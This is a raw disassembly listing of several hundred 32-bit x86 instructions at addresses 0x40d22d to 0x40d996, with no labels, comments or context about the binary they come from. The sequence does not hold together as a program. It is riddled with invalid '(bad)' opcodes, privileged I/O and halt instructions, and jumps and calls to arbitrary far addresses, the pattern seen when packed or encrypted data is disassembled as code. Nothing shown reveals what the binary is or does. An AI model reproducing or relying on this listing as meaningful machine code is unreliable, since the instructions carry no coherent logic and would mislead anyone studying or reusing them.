  40d22d:	or     al,0x7d
  40d22f:	sub    BYTE PTR ds:0x3b451dce,ch
  40d235:	dec    edx
  40d236:	test   DWORD PTR [ebx+esi*2+0x1c],edi
  40d23a:	lea    edi,[edi-0x6c]
  40d23d:	dec    ebx
  40d23e:	jno    0x40d23b
  40d240:	push   ss
  40d241:	shl    BYTE PTR [ecx+0x1c0f426],cl
  40d247:	push   ds
  40d248:	into   
  40d249:	pop    es
  40d24a:	pop    es
  40d24b:	arpl   WORD PTR [esi+0x9415680],sp
  40d251:	dec    ebp
  40d252:	shr    dh,cl
  40d254:	icebp  
  40d255:	retf   
  40d256:	in     al,0x4a
  40d258:	stos   DWORD PTR es:[edi],eax
  40d259:	xchg   edi,eax
  40d25a:	imul   eax,ebp,0xbecf4cb1
  40d260:	jne    0x40d2d8
  40d262:	(bad)  
  40d263:	jns    0x40d22a
  40d265:	ret    
  40d266:	aad    0x3c
  40d268:	push   ecx
  40d269:	lahf   
  40d26a:	cmc    
  40d26b:	(bad)  
  40d26c:	sub    eax,0x978f4ded
  40d271:	push   edi
  40d272:	xchg   ebx,eax
  40d273:	add    eax,0xb99c3882
  40d278:	xchg   edi,eax
  40d279:	popa   
  40d27a:	(bad)  
  40d27b:	into   
  40d27c:	xchg   ecx,eax
  40d27d:	out    0xc4,al
  40d27f:	aam    0xc8
  40d281:	frstorw [ebp+0x2a1b5b1a]
  40d288:	ss inc ebp
  40d28a:	mov    cl,0x8c
  40d28c:	push   esi
  40d28d:	add    eax,0xde1b59fb
  40d292:	mov    ?,ecx
  40d294:	or     al,0xb3
  40d296:	pop    ecx
  40d297:	or     al,0xb7
  40d299:	cmc    
  40d29a:	jmp    0x54b9:0xe6353e59
  40d2a1:	in     al,dx
  40d2a2:	ins    DWORD PTR es:[edi],dx
  40d2a3:	cs mov ch,0x11
  40d2a6:	enter  0x1fdd,0x42
  40d2aa:	pshufw mm5,mm2,0xbd
  40d2ae:	add    esi,esi
  40d2b0:	jg     0x40d273
  40d2b2:	test   DWORD PTR [edi-0x19],esi
  40d2b5:	pop    eax
  40d2b6:	repnz or eax,0xb1af43ac
  40d2bc:	test   al,0xcd
  40d2be:	fdiv   st(6),st
  40d2c0:	or     ah,ch
  40d2c2:	in     eax,0xc6
  40d2c4:	(bad)  
  40d2c5:	jne    0x40d2ee
  40d2c7:	pushf  
  40d2c8:	adc    BYTE PTR [esi-0x10],dl
  40d2cb:	jg     0x40d277
  40d2cd:	mov    esp,0x5dd77653
  40d2d2:	add    eax,DWORD PTR [edi-0x28]
  40d2d5:	dec    esi
  40d2d6:	das    
  40d2d7:	mov    ebx,0x88aab7be
  40d2dc:	aam    0x1c
  40d2de:	imul   ecx,DWORD PTR [edx-0x502c48af],0x2252d624
  40d2e8:	xor    DWORD PTR [esi],edi
  40d2ea:	pushf  
  40d2eb:	popf   
  40d2ec:	das    
  40d2ed:	adc    bl,cl
  40d2ef:	sbb    edi,DWORD PTR [ebx+0x27]
  40d2f2:	in     al,0xc9
  40d2f4:	pop    edx
  40d2f5:	adc    bl,bl
  40d2f7:	pop    ss
  40d2f8:	add    eax,0xcb2cf090
  40d2fd:	cmc    
  40d2fe:	sbb    ebp,ebx
  40d300:	scas   al,BYTE PTR es:[edi]
  40d301:	int3   
  40d302:	sahf   
  40d303:	mov    dl,0x72
  40d305:	das    
  40d306:	pop    eax
  40d307:	in     eax,dx
  40d308:	sbb    cl,BYTE PTR [edx]
  40d30a:	mov    edx,ds
  40d30c:	sbb    BYTE PTR ds:[eax+0x65],al
  40d310:	push   ds
  40d311:	retf   0xb170
  40d314:	(bad)  
  40d315:	sub    eax,0xa50528a7
  40d31a:	sub    ecx,esp
  40d31c:	and    eax,0xda24318f
  40d321:	shl    dh,cl
  40d323:	jno    0x40d2ef
  40d325:	mov    ds:0x823e4b8,eax
  40d32a:	sub    cl,BYTE PTR [esi+0x2d]
  40d32d:	repz pop ss
  40d32f:	xchg   edi,eax
  40d330:	rcl    BYTE PTR [ebp+ecx*1-0x65],cl
  40d334:	inc    ecx
  40d335:	lock push ebx
  40d337:	adc    BYTE PTR [eax+0x7d],bh
  40d33a:	out    0x36,eax
  40d33c:	jg     0x40d321
  40d33e:	pop    esi
  40d33f:	push   esp
  40d340:	pop    esi
  40d341:	fstp   QWORD PTR [eax]
  40d343:	adc    al,0xd2
  40d345:	aaa    
  40d346:	push   es
  40d347:	sub    cl,BYTE PTR fs:[ebp+0x12]
  40d34b:	push   ebx
  40d34c:	push   ebx
  40d34d:	push   esi
  40d34e:	add    bl,0x88
  40d351:	xchg   edx,eax
  40d352:	outs   dx,DWORD PTR ds:[esi]
  40d353:	mov    ebp,0x54e070f3
  40d358:	push   0xb9b3f0c0
  40d35d:	fst    QWORD PTR [edx-0x233d6fb5]
  40d363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d364:	je     0x40d370
  40d366:	xchg   edx,eax
  40d367:	repnz adc dl,BYTE PTR [esi+ebx*2-0x28dfdfaf]
  40d36f:	mov    esi,0x5496ff48
  40d374:	mov    edx,0xb0f803a6
  40d379:	test   dl,cl
  40d37b:	jnp    0x40d2ff
  40d37d:	inc    ecx
  40d37e:	cdq    
  40d37f:	test   eax,0x66d60a1e
  40d384:	push   ss
  40d385:	imul   esp,DWORD PTR [esi+0x136c608c],0xfa4f759d
  40d38f:	push   0x19
  40d391:	mov    bl,0x84
  40d393:	sub    esi,eax
  40d395:	mov    ah,BYTE PTR [ecx]
  40d397:	add    DWORD PTR [ecx],ecx
  40d399:	push   esp
  40d39a:	dec    esi
  40d39b:	jo     0x40d382
  40d39d:	cmp    BYTE PTR [ebp-0x37],dl
  40d3a0:	sti    
  40d3a1:	and    ebp,edi
  40d3a3:	jg     0x40d3a3
  40d3a5:	sub    ch,BYTE PTR [edi+esi*2+0x6b]
  40d3a9:	iret   
  40d3aa:	pop    ebx
  40d3ab:	pop    ebx
  40d3ac:	(bad)  
  40d3ad:	push   DWORD PTR [ecx-0x27]
  40d3b0:	xor    dl,BYTE PTR ds:0xf2b11141
  40d3b6:	ins    DWORD PTR es:[edi],dx
  40d3b7:	xchg   DWORD PTR [ebx+0x26],ebp
  40d3ba:	xchg   edx,eax
  40d3bb:	add    ebp,DWORD PTR [eax+0x0]
  40d3be:	push   esi
  40d3bf:	outs   dx,DWORD PTR ds:[esi]
  40d3c0:	(bad)  
  40d3c1:	sbb    al,0xc7
  40d3c3:	out    0xf3,al
  40d3c5:	inc    esp
  40d3c6:	scas   eax,DWORD PTR es:[edi]
  40d3c7:	add    DWORD PTR [eax],esp
  40d3c9:	cmp    BYTE PTR [eax-0x6cbda710],ch
  40d3cf:	scas   eax,DWORD PTR es:[edi]
  40d3d0:	jg     0x40d3a7
  40d3d2:	enter  0x1786,0xad
  40d3d6:	add    cl,BYTE PTR [esp+esi*1-0x3548d294]
  40d3dd:	sub    eax,0xf353ef26
  40d3e2:	push   ss
  40d3e3:	add    al,0xf9
  40d3e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3e6:	lock and DWORD PTR [edx-0x1475926e],ebx
  40d3ed:	xchg   edx,eax
  40d3ee:	xchg   edi,eax
  40d3ef:	pmaxub mm5,mm7
  40d3f2:	das    
  40d3f3:	mov    ds:0x9085c72b,eax
  40d3f8:	push   ebx
  40d3f9:	sub    al,0x7a
  40d3fb:	jmp    ebx
  40d3fd:	rcl    ecx,cl
  40d3ff:	jp     0x40d3e1
  40d401:	mov    WORD PTR [eax+0x4b12f0f8],fs
  40d407:	stc    
  40d408:	jl     0x40d449
  40d40a:	push   cs
  40d40b:	cmp    dl,BYTE PTR [ebp+edx*2+0x77]
  40d40f:	lock push edi
  40d411:	popf   
  40d412:	or     ebx,DWORD PTR [ecx+0x4c20f155]
  40d418:	fs ret 0x6f01
  40d41c:	add    ecx,ebp
  40d41e:	mov    ecx,0x6ce9d8f3
  40d423:	(bad)  
  40d424:	imul   esp,DWORD PTR [eax],0x47
  40d427:	push   0xffffffb5
  40d429:	dec    BYTE PTR [eax+0x5192ae7b]
  40d42f:	cmp    DWORD PTR [edi+0x17],ebp
  40d432:	mov    bl,0x9d
  40d434:	fstp   DWORD PTR [esi]
  40d436:	push   esi
  40d437:	mov    dl,0xe5
  40d439:	int    0xbf
  40d43b:	xchg   ecx,eax
  40d43c:	and    DWORD PTR [esi],ecx
  40d43e:	fxrstor [edx]
  40d441:	mov    eax,0xa19ef5b0
  40d446:	push   ebx
  40d447:	jae    0x40d3d9
  40d449:	aam    0x2b
  40d44b:	jnp    0x40d41b
  40d44d:	xchg   esi,eax
  40d44e:	inc    ebp
  40d44f:	and    ecx,DWORD PTR [ebx-0x44b09d25]
  40d455:	push   esi
  40d456:	mov    ds:0x51d71edf,eax
  40d45b:	push   cs
  40d45c:	sbb    esi,ebx
  40d45e:	pop    esp
  40d45f:	push   ss
  40d460:	xor    al,0xea
  40d462:	push   edx
  40d463:	jno    0x40d48c
  40d465:	mov    edi,0xce0a8a9e
  40d46a:	sub    eax,0x6019b329
  40d46f:	and    eax,0xc0bc64ed
  40d474:	rcr    BYTE PTR [ebp-0x1d],cl
  40d477:	jmp    0x40d496
  40d479:	push   ecx
  40d47a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d47b:	arpl   WORD PTR [ebp+0x479991cd],dx
  40d481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d482:	pop    esi
  40d483:	or     cl,BYTE PTR [ecx]
  40d485:	aas    
  40d486:	fiadd  DWORD PTR [ebp+eiz*4-0x2298f8b]
  40d48d:	lods   al,BYTE PTR gs:[esi]
  40d48f:	or     eax,0x6b519bf4
  40d494:	into   
  40d495:	and    ch,BYTE PTR [ebp-0x3387d89]
  40d49b:	pop    ebp
  40d49c:	mov    WORD PTR [eax-0x10],?
  40d49f:	jnp    0x40d4da
  40d4a1:	xchg   esi,eax
  40d4a2:	xor    eax,0xbd597887
  40d4a7:	mov    cl,BYTE PTR [ebp+esi*4+0x16]
  40d4ab:	mov    WORD PTR [eax-0x3db3c26a],?
  40d4b1:	cli    
  40d4b2:	mov    ebp,0x34de24f3
  40d4b7:	in     eax,dx
  40d4b8:	push   eax
  40d4b9:	jmp    0x40d527
  40d4bb:	inc    ebx
  40d4bc:	fwait
  40d4bd:	imul   esp,DWORD PTR [esi+0x4e],0x411e7b51
  40d4c4:	pop    ebp
  40d4c5:	xor    esi,eax
  40d4c7:	dec    eax
  40d4c8:	pop    esp
  40d4c9:	cmp    eax,0xd3801b51
  40d4ce:	mov    al,bl
  40d4d0:	div    BYTE PTR [eax+edi*4-0x30]
  40d4d4:	iret   
  40d4d5:	inc    esp
  40d4d6:	mov    ecx,edx
  40d4d8:	test   al,0x48
  40d4da:	mov    esi,0xaf8615e9
  40d4df:	in     al,0x3a
  40d4e1:	scas   al,BYTE PTR es:[edi]
  40d4e2:	push   esi
  40d4e3:	int    0xae
  40d4e5:	pop    ecx
  40d4e6:	adc    BYTE PTR [ebp+0x4ec0d7ae],0x2c
  40d4ed:	jge    0x40d54d
  40d4ef:	sub    BYTE PTR [edi+esi*8],ch
  40d4f2:	inc    ebp
  40d4f3:	pusha  
  40d4f4:	xor    eax,0x4eab1c5d
  40d4f9:	jmp    0x6418a0ec
  40d4fe:	scas   eax,DWORD PTR es:[edi]
  40d4ff:	scas   eax,DWORD PTR es:[edi]
  40d500:	in     al,dx
  40d501:	gs jecxz 0x40d4f1
  40d504:	pop    edx
  40d505:	repnz (bad) 
  40d507:	push   DWORD PTR [ebp-0xfff0e42]
  40d50d:	mov    edx,0xbcae858e
  40d512:	shl    DWORD PTR [ebx],0x7c
  40d515:	in     al,0xf3
  40d517:	hlt    
  40d518:	popa   
  40d519:	sub    BYTE PTR [esi],0x93
  40d51c:	push   esp
  40d51d:	mov    ds:0xcc3694d0,al
  40d522:	push   esi
  40d523:	int3   
  40d524:	sub    ah,0xd1
  40d527:	xchg   ebp,ebx
  40d529:	outs   dx,BYTE PTR ds:[esi]
  40d52a:	aam    0xc4
  40d52c:	pop    esp
  40d52d:	push   edi
  40d52e:	sbb    dl,ch
  40d530:	mov    esi,0x690f921f
  40d535:	test   eax,0xf0c74d32
  40d53a:	jo     0x40d519
  40d53c:	js     0x40d4d3
  40d53e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d53f:	inc    ebp
  40d540:	aaa    
  40d541:	push   ecx
  40d542:	stos   DWORD PTR es:[edi],eax
  40d543:	call   0x726c7881
  40d548:	cdq    
  40d549:	(bad)  
  40d54b:	mov    edx,0x4434447a
  40d550:	jecxz  0x40d50b
  40d552:	jno    0x40d5b6
  40d554:	jecxz  0x40d4e5
  40d556:	cmc    
  40d557:	ret    0x3312
  40d55a:	dec    ebx
  40d55b:	add    edx,ebp
  40d55d:	jb     0x40d558
  40d55f:	(bad)  
  40d560:	in     eax,dx
  40d561:	sub    eax,0xabb2873d
  40d566:	cmp    eax,DWORD PTR [ebx+0x7d10e8a9]
  40d56c:	mov    dh,0x43
  40d56e:	inc    edx
  40d56f:	add    al,0xba
  40d571:	outs   dx,BYTE PTR ds:[esi]
  40d572:	jne    0x40d50f
  40d574:	pop    ecx
  40d575:	fiadd  DWORD PTR [ebp+0x478f18f]
  40d57b:	sub    BYTE PTR [esi],bh
  40d57d:	mov    esi,0x32a063f4
  40d582:	add    eax,0xcb29ca63
  40d587:	cmp    BYTE PTR [ebx-0x175ccc81],dl
  40d58d:	inc    esi
  40d58e:	push   ds
  40d58f:	lods   eax,DWORD PTR ds:[esi]
  40d590:	lock sbb bh,bh
  40d593:	adc    BYTE PTR [edi-0x38eb2c72],cl
  40d599:	hlt    
  40d59a:	stc    
  40d59b:	addr16 mov ah,0x89
  40d59e:	imul   esi,DWORD PTR [edx-0x53],0x41e8c398
  40d5a5:	sbb    al,BYTE PTR ds:0x7e4a6a3e
  40d5ab:	js     0x40d5ac
  40d5ad:	aas    
  40d5ae:	(bad)  
  40d5af:	fimul  DWORD PTR [edi+0x18]
  40d5b2:	add    DWORD PTR [esp+eiz*4-0x6f734ad5],eax
  40d5b9:	(bad)  
  40d5ba:	das    
  40d5bb:	add    DWORD PTR ds:0xfc967cbc,edi
  40d5c1:	mov    esp,0xcd6de44
  40d5c6:	mov    bl,0x68
  40d5c8:	cwde   
  40d5c9:	mov    ebx,0xac471ed3
  40d5ce:	fwait
  40d5cf:	call   0xcb72:0xa23e8ddc
  40d5d6:	cwde   
  40d5d7:	ret    0xf05
  40d5da:	inc    eax
  40d5db:	and    ebp,DWORD PTR [edx+0x5a]
  40d5de:	(bad)  
  40d5df:	jmp    FWORD PTR [edi]
  40d5e1:	fadd   QWORD PTR [edi-0x68]
  40d5e4:	out    0x74,al
  40d5e6:	xchg   edi,eax
  40d5e7:	mov    edi,0x5aeff198
  40d5ec:	es cmc 
  40d5ee:	xor    dh,bh
  40d5f0:	sub    al,0xb8
  40d5f2:	in     eax,dx
  40d5f3:	mov    ebp,0x4ac61619
  40d5f8:	clc    
  40d5f9:	adc    eax,0xeac56019
  40d5fe:	sub    BYTE PTR [ecx+edi*4-0x73f0fbc0],ch
  40d605:	mov    bl,0xf7
  40d607:	xchg   ebp,eax
  40d608:	cmp    eax,0x857bfcf
  40d60d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d60e:	test   dh,dl
  40d610:	test   eax,0xd48b3c20
  40d615:	or     DWORD PTR [ecx+0x47],0x12ca7c9
  40d61c:	out    dx,al
  40d61d:	cmp    eax,0xf06e5a64
  40d622:	arpl   WORD PTR ds:0x22b8ad8d,bx
  40d628:	jmp    0x40d63c
  40d62a:	mov    ah,cl
  40d62c:	xor    DWORD PTR [esp+eax*1],ebx
  40d62f:	pop    esi
  40d630:	retf   
  40d631:	push   ebx
  40d632:	mov    ah,0x1b
  40d634:	es cdq 
  40d636:	sub    esp,edx
  40d638:	jo     0x40d5c4
  40d63a:	mov    ebp,0xbc2fc804
  40d63f:	xor    DWORD PTR [edx+0x33648a42],0x71538e70
  40d649:	pop    esp
  40d64a:	inc    ebp
  40d64b:	test   eax,0xbb64c753
  40d650:	xchg   ebp,eax
  40d651:	push   edi
  40d652:	pop    es
  40d653:	adc    DWORD PTR [eax+eiz*1],eax
  40d656:	bound  ebx,QWORD PTR [eax]
  40d658:	test   BYTE PTR [eax+0x66],0x35
  40d65c:	ins    DWORD PTR es:[edi],dx
  40d65d:	mov    dl,0xaf
  40d65f:	aaa    
  40d660:	adc    al,0x62
  40d662:	pop    si
  40d664:	push   esp
  40d665:	xchg   esi,eax
  40d666:	loop   0x40d66d
  40d668:	jecxz  0x40d67f
  40d66a:	aaa    
  40d66b:	inc    eax
  40d66c:	dec    edi
  40d66d:	add    dl,BYTE PTR [edi-0x1a]
  40d670:	pop    esi
  40d671:	lods   eax,DWORD PTR cs:[esi]
  40d673:	inc    eax
  40d674:	add    DWORD PTR [ebx+0x2055bdff],0xffffffad
  40d67b:	fist   DWORD PTR [edi-0x403c0325]
  40d681:	stos   BYTE PTR es:[edi],al
  40d682:	cmp    eax,0x10b8843d
  40d687:	fstp   TBYTE PTR [esi]
  40d689:	call   0x3f10f8b2
  40d68e:	or     al,0x21
  40d690:	sbb    esp,DWORD PTR [ebx-0x13aab716]
  40d696:	out    dx,eax
  40d697:	mov    eax,0x7562c42b
  40d69c:	adc    ebp,DWORD PTR [edx-0x4c75b33]
  40d6a2:	test   al,0xa2
  40d6a4:	push   ebx
  40d6a5:	add    ecx,ecx
  40d6a7:	or     DWORD PTR [eax],eax
  40d6a9:	loope  0x40d68a
  40d6ab:	jno    0x40d681
  40d6ad:	popf   
  40d6ae:	pop    edi
  40d6af:	sub    cl,0x7
  40d6b2:	ss jg  0x40d716
  40d6b5:	fwait
  40d6b6:	and    esp,0x38
  40d6b9:	pop    edi
  40d6ba:	js     0x40d64d
  40d6bc:	push   ebp
  40d6bd:	adc    eax,0x91819a8a
  40d6c2:	add    al,0x60
  40d6c4:	jmp    0x70d1:0x1f28f868
  40d6cb:	es std 
  40d6cd:	xchg   DWORD PTR [ebp+0x6f86400c],ecx
  40d6d3:	cmp    bl,dl
  40d6d5:	pop    ss
  40d6d6:	cmc    
  40d6d7:	sub    eax,0x93df02b3
  40d6dc:	xor    al,al
  40d6de:	cmc    
  40d6df:	pushf  
  40d6e0:	(bad)  
  40d6e2:	pop    ebx
  40d6e3:	iret   
  40d6e4:	adc    ch,BYTE PTR [esi-0x3892952e]
  40d6ea:	sbb    eax,0x77209f64
  40d6ef:	fstp   st(5)
  40d6f1:	mov    ah,0x37
  40d6f3:	in     eax,dx
  40d6f4:	out    dx,eax
  40d6f5:	arpl   WORD PTR ds:0xe2ff1b80,sp
  40d6fb:	mov    bl,0x36
  40d6fd:	imul   BYTE PTR [ecx+0x78]
  40d700:	lods   al,BYTE PTR ds:[esi]
  40d701:	dec    edi
  40d702:	test   eax,0x4c457759
  40d707:	xor    edi,esi
  40d709:	add    al,0xb2
  40d70b:	xchg   ebx,eax
  40d70c:	jo     0x40d737
  40d70e:	(bad)  
  40d70f:	fnstcw WORD PTR [eax+0x62]
  40d712:	jmp    0x1dea:0xe2c146e1
  40d719:	retf   
  40d71a:	ret    
  40d71b:	dec    esp
  40d71c:	mov    ds:0xb038b7cd,eax
  40d721:	and    eax,0x350f1557
  40d726:	(bad)  
  40d727:	(bad)  
  40d729:	and    eax,DWORD PTR [edx+0x33]
  40d72c:	icebp  
  40d72d:	aaa    
  40d72e:	or     DWORD PTR [eax],edi
  40d730:	cli    
  40d731:	pop    ecx
  40d732:	inc    ebp
  40d733:	ins    DWORD PTR es:[edi],dx
  40d734:	adc    bh,BYTE PTR [ecx+0x5c]
  40d737:	js     0x40d793
  40d739:	pop    ds
  40d73a:	dec    edx
  40d73b:	mov    DWORD PTR [edi-0x67832329],esp
  40d741:	call   0xe2198d05
  40d746:	pop    edx
  40d747:	xchg   edi,eax
  40d748:	mov    bl,0x9c
  40d74a:	add    BYTE PTR [edi+eiz*2-0x70334670],dl
  40d751:	pop    eax
  40d752:	jne    0x40d706
  40d754:	jae    0x40d747
  40d756:	popa   
  40d757:	pop    ds
  40d758:	inc    edx
  40d759:	jmp    0xff2fa85d
  40d75e:	leave  
  40d75f:	jp     0x40d7ac
  40d761:	dec    ebx
  40d762:	mov    ch,0x74
  40d764:	xor    BYTE PTR [edx+0x7],0x0
  40d768:	nop
  40d769:	imul   BYTE PTR [esi+0x297bd38c]
  40d76f:	out    dx,al
  40d770:	add    ah,BYTE PTR [edx+ecx*2-0x5e]
  40d774:	mov    bl,0xd9
  40d776:	dec    ebp
  40d777:	fadd   st(4),st
  40d779:	xchg   esi,eax
  40d77a:	pop    esp
  40d77b:	loopne 0x40d7f2
  40d77d:	xchg   esi,eax
  40d77e:	sbb    al,0x26
  40d780:	sbb    DWORD PTR [edx+0x51],0x2d80d246
  40d787:	push   eax
  40d788:	jp     0x40d7d6
  40d78a:	daa    
  40d78b:	retf   
  40d78c:	ss shl bl,0x36
  40d790:	cmp    ebp,DWORD PTR [ebx+0x3f]
  40d793:	aas    
  40d794:	sbb    BYTE PTR es:[edi+0x25f78366],bl
  40d79b:	movzx  ecx,WORD PTR [edi]
  40d79e:	inc    esi
  40d79f:	cmc    
  40d7a0:	mov    dl,0x6d
  40d7a2:	(bad)  
  40d7a4:	xchg   BYTE PTR [ecx],bh
  40d7a6:	cdq    
  40d7a7:	out    dx,al
  40d7a8:	add    BYTE PTR [ebx],ch
  40d7aa:	dec    ebx
  40d7ab:	sbb    BYTE PTR [ebx],ah
  40d7ad:	jnp    0x40d7a1
  40d7af:	inc    ebx
  40d7b0:	(bad)  
  40d7b1:	retf   
  40d7b2:	(bad)  
  40d7b3:	pop    edx
  40d7b4:	fcmovnu st,st(1)
  40d7b6:	dec    eax
  40d7b7:	loopne 0x40d7d7
  40d7b9:	sti    
  40d7ba:	data16 jo 0x40d7ff
  40d7bd:	add    esi,DWORD PTR [ecx+esi*1]
  40d7c0:	jno    0x40d7d4
  40d7c2:	xor    eax,0x1d30e847
  40d7c7:	ins    DWORD PTR es:[edi],dx
  40d7c8:	sub    al,0x4
  40d7ca:	dec    esp
  40d7cb:	or     DWORD PTR [ebx+0x6c],edx
  40d7ce:	xchg   esi,eax
  40d7cf:	not    DWORD PTR [edi]
  40d7d1:	lahf   
  40d7d2:	push   ds
  40d7d3:	je     0x40d7c1
  40d7d5:	sub    dl,BYTE PTR [ebx+eiz*4]
  40d7d8:	push   ecx
  40d7d9:	mov    BYTE PTR ds:0xca7d91dc,bl
  40d7df:	shl    ebp,0xfb
  40d7e2:	cli    
  40d7e3:	lea    edi,[edi]
  40d7e5:	pop    ss
  40d7e6:	xchg   ecx,eax
  40d7e7:	pop    esi
  40d7e8:	aad    0x3b
  40d7ea:	pop    edx
  40d7eb:	je     0x40d809
  40d7ed:	adc    eax,0x4d561316
  40d7f2:	add    esi,DWORD PTR [bp+0x47c]
  40d7f7:	mov    eax,DWORD PTR [edx+eiz*1+0x4d]
  40d7fb:	repnz mov esi,0xddababa1
  40d801:	dec    ebp
  40d802:	hlt    
  40d803:	out    0x2c,eax
  40d805:	popa   
  40d806:	xor    al,BYTE PTR [ebx-0x5e]
  40d809:	pop    esi
  40d80a:	call   0xc6c4:0x4324cf8a
  40d811:	cmp    BYTE PTR [edx],dh
  40d813:	cmp    al,0x34
  40d815:	in     eax,dx
  40d816:	ins    DWORD PTR es:[edi],dx
  40d817:	(bad)  
  40d818:	les    edi,FWORD PTR [ecx+0x5d1fae11]
  40d81e:	and    eax,0xc53c8814
  40d823:	xor    DWORD PTR [ebx-0x4a],0x7a
  40d827:	inc    ecx
  40d828:	daa    
  40d829:	dec    esi
  40d82a:	int3   
  40d82b:	inc    eax
  40d82c:	inc    edi
  40d82d:	xlat   BYTE PTR ds:[ebx]
  40d82e:	neg    BYTE PTR [esi]
  40d830:	xor    eax,0x1679ede2
  40d835:	sti    
  40d836:	pop    ebx
  40d837:	scas   eax,DWORD PTR es:[edi]
  40d838:	sub    bl,ch
  40d83a:	in     al,dx
  40d83b:	jb     0x40d81a
  40d83d:	cli    
  40d83e:	pop    ebp
  40d83f:	fs pop ebp
  40d841:	jg     0x40d8a1
  40d843:	or     BYTE PTR [esi-0x4d],al
  40d846:	push   es
  40d847:	stos   BYTE PTR es:[edi],al
  40d848:	in     al,0x29
  40d84a:	add    esi,DWORD PTR [edi-0x5b00f39b]
  40d850:	pop    ebp
  40d851:	cmp    al,0xfc
  40d853:	in     eax,0x36
  40d855:	sbb    eax,0x41a73261
  40d85a:	mov    eax,ds:0x1e02091
  40d85f:	mov    dl,0x50
  40d861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d862:	ja     0x40d7ec
  40d864:	mov    WORD PTR [edx-0x36],?
  40d867:	js     0x40d86b
  40d869:	sti    
  40d86a:	xchg   edx,eax
  40d86b:	bound  eax,QWORD PTR cs:[esi]
  40d86e:	outs   dx,BYTE PTR ds:[esi]
  40d86f:	mov    esp,0x2489ee54
  40d874:	xchg   ebp,eax
  40d875:	sbb    al,0xd2
  40d877:	xor    cl,BYTE PTR [edx]
  40d879:	ja     0x40d867
  40d87b:	ins    BYTE PTR es:[edi],dx
  40d87c:	lea    ecx,[ecx-0x635be1cf]
  40d882:	push   edi
  40d883:	aad    0xe8
  40d885:	scas   al,BYTE PTR es:[edi]
  40d886:	xor    al,0xc0
  40d888:	cmp    eax,0x8015cb06
  40d88d:	mov    ch,0xb
  40d88f:	aam    0x8b
  40d891:	test   al,0xa7
  40d893:	dec    ebx
  40d894:	loop   0x40d834
  40d896:	scas   eax,DWORD PTR es:[edi]
  40d897:	ret    
  40d898:	mov    edi,0x6db71e0f
  40d89d:	rol    DWORD PTR [edi],cl
  40d89f:	dec    ebp
  40d8a0:	and    BYTE PTR [edi],ah
  40d8a2:	clc    
  40d8a3:	push   eax
  40d8a4:	enter  0x111e,0x72
  40d8a8:	mov    ebp,0x8681e842
  40d8ad:	adc    edx,ebx
  40d8af:	cwde   
  40d8b0:	pop    ebx
  40d8b1:	or     eax,0x7b400b4
  40d8b6:	fstp   DWORD PTR [eax]
  40d8b8:	jp     0x40d845
  40d8ba:	inc    edi
  40d8bb:	mov    ch,0x7a
  40d8bd:	jge    0x40d90c
  40d8bf:	mov    dh,0xe0
  40d8c1:	jnp    0x40d892
  40d8c3:	or     DWORD PTR [ecx+esi*4],ecx
  40d8c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8c7:	pusha  
  40d8c8:	xor    cl,dh
  40d8ca:	mov    bl,0xee
  40d8cc:	(bad)  
  40d8cd:	icebp  
  40d8ce:	pop    ecx
  40d8cf:	in     al,0x67
  40d8d1:	dec    ebx
  40d8d2:	push   eax
  40d8d3:	lahf   
  40d8d4:	test   al,0x13
  40d8d6:	push   eax
  40d8d7:	lods   al,BYTE PTR ds:[esi]
  40d8d8:	pop    esi
  40d8d9:	aad    0x3f
  40d8db:	je     0x40d8e2
  40d8dd:	or     DWORD PTR [eax+ebx*1],edx
  40d8e0:	mov    dh,0x40
  40d8e2:	jp     0x40d911
  40d8e4:	(bad)  
  40d8e5:	in     al,dx
  40d8e6:	dec    esp
  40d8e7:	or     dl,bh
  40d8e9:	sar    DWORD PTR ds:0x26789c89,1
  40d8ef:	imul   edi,DWORD PTR [esi],0x8bb4f7c9
  40d8f5:	xchg   ecx,eax
  40d8f6:	xchg   ebx,eax
  40d8f7:	mov    eax,0xf8b67fce
  40d8fc:	xor    ebx,ebx
  40d8fe:	jo     0x40d89d
  40d900:	test   BYTE PTR [ebp-0x5aaff76d],al
  40d906:	jmp    0x9d15:0x856cc10d
  40d90d:	test   DWORD PTR [edx+eax*1],edi
  40d910:	sbb    al,0x90
  40d913:	add    al,0x34
  40d915:	jmp    0x40d90d
  40d917:	repz mov ebp,0xa0b63bec
  40d91d:	dec    ecx
  40d91e:	adc    ebp,DWORD PTR [esi-0x7890fefb]
  40d924:	or     eax,0xc445f69f
  40d929:	loope  0x40d8d5
  40d92b:	pop    ebp
  40d92c:	sub    al,0xb5
  40d92e:	mov    dh,0x1a
  40d930:	retf   0x3af6
  40d933:	fnstenv [ebp-0x10038733]
  40d939:	aas    
  40d93a:	int3   
  40d93b:	loopne 0x40d8c9
  40d93d:	popf   
  40d93e:	jmp    0x40d96e
  40d940:	jno    0x40d97c
  40d942:	test   BYTE PTR [edx+0x6],0x50
  40d946:	enter  0xbaf6,0xae
  40d94a:	jge    0x40d9cb
  40d94c:	mov    dl,0xfa
  40d94e:	aas    
  40d94f:	adc    esp,edx
  40d951:	scas   al,BYTE PTR es:[edi]
  40d952:	les    edx,FWORD PTR [ecx-0x6b]
  40d955:	or     al,0x7a
  40d957:	mov    ds:0x83862135,eax
  40d95c:	ins    DWORD PTR es:[edi],dx
  40d95d:	push   es
  40d95e:	dec    ebx
  40d95f:	ror    BYTE PTR [edx+0x49],0x90
  40d963:	pop    ebx
  40d964:	cmp    DWORD PTR [ecx+0xdfc1a4e],ebp
  40d96a:	dec    edi
  40d96b:	mov    BYTE PTR [eax],0xbe
  40d96e:	je     0x40d96f
  40d970:	sub    esp,eax
  40d972:	bnd ret 0xefbc
  40d976:	out    dx,al
  40d977:	cmp    ah,al
  40d979:	ss icebp 
  40d97b:	les    edx,FWORD PTR [esi-0x56]
  40d97e:	pop    ecx
  40d97f:	les    esi,FWORD PTR [eax-0x11756d7]
  40d985:	sub    edx,edi
  40d987:	mov    bh,0x4b
  40d989:	into   
  40d98a:	jle    0x40d9fb
  40d98c:	pop    esp
  40d98d:	or     eax,0xa51f24ec
  40d992:	pop    edi
  40d993:	xchg   dl,dl
  40d995:	int3   
  40d996:	pop    eax
